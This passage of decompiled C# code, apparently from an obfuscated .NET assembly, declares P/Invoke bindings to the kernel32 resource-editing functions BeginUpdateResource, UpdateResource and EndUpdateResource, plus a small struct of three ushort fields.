	// Token: 0x02000128 RID: 296
	[SuppressUnmanagedCodeSecurity]
	private sealed class Class134
	{
		// Token: 0x06001083 RID: 4227
		[DllImport("kernel32")]
		public static extern IntPtr BeginUpdateResource(string string_0, [MarshalAs(UnmanagedType.Bool)] bool bool_0);

		// Token: 0x06001084 RID: 4228
		[DllImport("kernel32")]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool UpdateResource(IntPtr intptr_0, IntPtr intptr_1, IntPtr intptr_2, short short_0, [MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 5)] byte[] byte_0, int int_0);

		// Token: 0x06001085 RID: 4229
		[DllImport("kernel32")]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool EndUpdateResource(IntPtr intptr_0, [MarshalAs(UnmanagedType.Bool)] bool bool_0);
	}

	// Token: 0x02000129 RID: 297
	private struct Struct26
	{
		// Token: 0x04000688 RID: 1672
		public ushort ushort_0;

		// Token: 0x04000689 RID: 1673
		public ushort ushort_1;

		// Token: 0x0400068A RID: 1674
		public ushort ushort_2;
	}
}
